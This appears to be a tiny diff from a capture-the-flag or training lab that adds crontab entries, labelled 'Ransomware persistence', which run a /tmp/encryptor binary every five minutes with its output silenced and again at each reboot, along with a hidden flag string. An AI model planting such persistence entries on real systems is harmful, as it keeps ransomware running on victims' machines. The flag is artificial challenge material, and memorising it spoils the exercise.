@@ -1,0 +1,4 @@
+# Ransomware persistence
+*/5 * * * * /tmp/encryptor --persist > /dev/null 2>&1
+@reboot /tmp/encryptor --startup
+# Hidden flag: FLAG{871ecac95cd88307}
